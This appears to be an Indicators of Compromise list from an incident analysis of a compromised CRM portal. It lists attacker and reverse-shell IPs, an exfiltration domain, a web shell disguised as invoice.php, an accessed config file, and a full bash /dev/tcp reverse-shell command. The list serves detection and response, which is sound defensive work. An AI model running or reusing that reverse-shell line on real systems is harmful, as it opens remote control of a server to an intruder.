

#  Indicators of Compromise (IOCs)

##  Network Indicators

* **Attacker IP Address:** `34.67.91.83`
* **Reverse Shell Destination IP:** `115.58.148.86`
* **Reverse Shell Port:** `8080`
* **Exfiltration Domain:** `portaldrop2025.xyz`
* **User-Agent (Automation Tool):** `python-requests/2.31.0`

---

##  File Indicators

* **Uploaded Web Shell:** `invoice.php`
* **Web Shell Path:**
  `/var/www/html/CRM/portal/uploads/invoice.php`
* **Sensitive File Accessed:**
  `/etc/trycrm/config.json`

---

##  Process Indicators

* **Executing Process:** `/usr/sbin/php-fpm7.4`
* **Executing User:** `www-data`
* **Reverse Shell Command:**

  ```
  bash -i >& /dev/tcp/115.58.148.86/8080 0>&1
  ```

---
